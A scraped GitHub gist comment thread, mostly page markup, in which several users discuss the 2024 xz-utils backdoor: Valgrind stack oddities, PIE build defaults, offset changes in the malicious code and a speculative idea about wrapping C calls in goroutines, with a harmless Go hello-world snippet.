    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021701-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/AdrianBunk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/AdrianBunk">AdrianBunk</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021701#gistcomment-5021701" id="gistcomment-5021701-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T21:46:40Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<blockquote>
<p dir="auto">Maybe a doubt that is "at all wrong" also shows the doubter has no experience?</p>
</blockquote>
<p dir="auto">Polite as you are, you used " maybe". Politeness won't help you against a criminal hacker's ideas. The experiences of doubters are often worth more than those of so-called fact-checkers.</p>
</blockquote>
<blockquote>
<p dir="auto">if you waited patiently after reading carefully until you really understood what you had read, without ignoring the meaning of the words, you could avoid misinterpretations and make fewer inference errors.</p>
</blockquote>
<p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/flybyray">@flybyray</a> Conspiracy theories and insults from people like you are not helpful.</p>
<p dir="auto">A huge amount of people all over the world who are highly competent in this area have been working on dissecting this exploit for 2 weeks, anyone who claims to have found something new on the technical side here in this discussion only demonstrates being clueless.</p>
<p dir="auto">Please stop it.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021701" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="me-Fh7wkGPuPzMHx0F2MUzs4t9hMyDaDvyKEM_4VMLm66MSbiSCJNtNtZIoZPxZlK_nLXYIYSCtff3gXrTVgaA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021701/edit_form?textarea_id=gistcomment-5021701-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/AdrianBunk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/AdrianBunk"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/3358267?s=80&amp;v=4" width="40" height="40" alt="@AdrianBunk" /></a>
    </div>
    <div id="gistcomment-5021703" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5021703-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/AdrianBunk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/AdrianBunk">AdrianBunk</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5021703#gistcomment-5021703" id="gistcomment-5021703-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-12T21:50:53Z" class="no-wrap">Apr 12, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOADM-O9oAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMoAc"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">The <code class="notranslate">0x6</code> address is pretty easy, that's evidence of something being compiled with the <code class="notranslate">-fPIE</code> compile time flag set, something the build scripts of xz-utils <em>do not</em> do (including the compromised ones).</p>
</blockquote>
<p dir="auto">All major distributions (including Debian) changed their compiler to default to PIE several years ago for ASLR.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021703" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="092r9M8TF-9QalRijSvYX34g4yeT7OMRUD10kbuXcvTvJtEZZtbtgLLUa9oMzLSUY0jXLsUb-Hs1y-xhvafy4g" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5021703/edit_form?textarea_id=gistcomment-5021703-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/christoofar/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/christoofar"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/5059144?s=80&amp;v=4" width="40" height="40" alt="@christoofar" /></a>
    </div>
    <div id="gistcomment-5022283" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5022283-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/christoofar/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/christoofar">christoofar</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022283#gistcomment-5022283" id="gistcomment-5022283-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-13T14:47:15Z" class="no-wrap">Apr 13, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAE0ySNoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMoks"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">Has anyone done any detailed examination of the exact cause of the Valgrind errors that Freund (and Fedora and maybe other distros) saw?</p>
<p dir="auto"><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2267598" rel="nofollow">https://bugzilla.redhat.com/show_bug.cgi?id=2267598</a></p>
<p dir="auto">I'm mainly curious about the strange stack addresses like 0x6 and 0x77AD31E59B84CFFF. The persons responsible did try to cover up by adding an option to turn off omit-frame-pointer. Does the exploit assume the use of the frame pointer, and if it isn't there gets the stack layout wrong and writes below the stack pointer? (Below literally means below as in address less than RSP, not from the inverted view of the grow-down stack. But not as far below as the stack guard). omit-frame-pointer may also be affecting Valgrind's stack walking.</p>
</blockquote>
<p dir="auto">When we talked it out, the function that was doing this nuke (<code class="notranslate">microlzma</code> is what Jia Tan wants to raise during init), did not supply a size when it entered the loop to start writing <code class="notranslate">0x00</code> into a stack area.</p>
<p dir="auto">This function, <code class="notranslate">lzma_stream_header_encodb</code>, is not in the 5.6.1 <code class="notranslate">.o</code> release, it only appears in the 5.6.0;  hence the theory that a mistake in the feature flags for the build did not completely strip out the setup for a debug/examine tool (which would have reported out the progress of the locator and possibly also brought in a more comprehensive debug/examine tool as an option).   My guess is that it's not a mistake in the offsets calculations (there is a whole DASM library inside the malware), but a way to quickly patch the obfuscations in while still making sure that the hotloading core code stays functional.</p>
<p dir="auto">Jan Tan needed someway to know that he landed on all the jump calls needed to patch <code class="notranslate">libcrypto</code>.</p>
<p dir="auto">Further:  The final <code class="notranslate">5.6.1</code> has an insert in the ELF table for a note area that is moving all the bytes down <code class="notranslate">0x26</code>, and throwing the asm dumps into diff shows a heavy amount of offset changes in <code class="notranslate">microlzma</code>, the gateway to the backdoor.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022283" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="Yr21SZSDbNz2pb2MigBCQbzEEC4cCIX4_f-zqZqimreVmZT-9SwhY_CQne0Aew2ePeC6Y8UDnnUt1iN9wQe0CA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022283/edit_form?textarea_id=gistcomment-5022283-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/christoofar/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/christoofar"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/5059144?s=80&amp;v=4" width="40" height="40" alt="@christoofar" /></a>
    </div>
    <div id="gistcomment-5022356" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5022356-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/christoofar/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/christoofar">christoofar</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022356#gistcomment-5022356" id="gistcomment-5022356-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-13T16:45:28Z" class="no-wrap">Apr 13, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAE0ySNoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMopQ"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">I've been thinking a lot about this as a CGo/gccgo dev:  "What can a HLL programmer do against the likes of Jia Tan?  They're attacking from the foundation software."</p>
<p dir="auto">I'm not settled on this one but wrapping calls to C libs in goroutines probably would raise the difficultly level, as the rapid context switches and unpredictability introduced on where the Go runtime will move the jump calls happens.</p>
<p dir="auto">After 129,000 lines of asm, here is <code class="notranslate">printf("Hello World")</code> in Go down at the bottom:<br>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/5059144/322214129-7c5547a9-800f-4f50-98e8-6e57377438e1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDEyOS03YzU1NDdhOS04MDBmLTRmNTAtOThlOC02ZTU3Mzc3NDM4ZTEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MDkzNWM4YjQyMzc2N2E3NWY1Njk3MmRhYWY3ODEwMGM2MDc4MjEwMzQyZGQ1OTdiOTMxNGU0OWVmYWZhNjVjOCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.wYtm4USCm4r7DNpxPMcGoQSB1Ogt55pZUliN6wvKYJk"><img src="https://private-user-images.githubusercontent.com/5059144/322214129-7c5547a9-800f-4f50-98e8-6e57377438e1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDEyOS03YzU1NDdhOS04MDBmLTRmNTAtOThlOC02ZTU3Mzc3NDM4ZTEucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9MDkzNWM4YjQyMzc2N2E3NWY1Njk3MmRhYWY3ODEwMGM2MDc4MjEwMzQyZGQ1OTdiOTMxNGU0OWVmYWZhNjVjOCZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.wYtm4USCm4r7DNpxPMcGoQSB1Ogt55pZUliN6wvKYJk" alt="image" style="max-width: 100%;"></a></p>
<p dir="auto">Now, let's see what happens when we do this:</p>
<pre class="notranslate"><code class="notranslate">func main() {
	hello := "Hello world!"
	go func() {
		print(hello)
	}()
	time.Sleep(1*time.Second)
}
</code></pre>
<p dir="auto">Now we're asking the Go runtime to activate concurrency and <code class="notranslate">main</code> itself gets split into two compact parts with an anonymous function that disappears into the goroutine ecosphere (to get this to fit I'm stripping symbols):<br>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/5059144/322214734-2474085d-bff5-4ff7-94c5-d56c29c0d5d0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjcxMTQsIm5iZiI6MTczNjU2NjgxNCwicGF0aCI6Ii81MDU5MTQ0LzMyMjIxNDczNC0yNDc0MDg1ZC1iZmY1LTRmZjctOTRjNS1kNTZjMjljMGQ1ZDAucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDExMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAxMTFUMDM0MDE0WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9NmExZTQ4ODgxYWVlMGNjODQwNTYwNTk0ZmY2ZDg5NjQ1ZmY1OWVlODk4MzhkOWQ2ZDkyY2U3ZWY1YmM5NTBkMyZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.9dA5mNX0pGxhVKcNA97fMuJ6U2-k3xJaZpe33agIvqI"><img 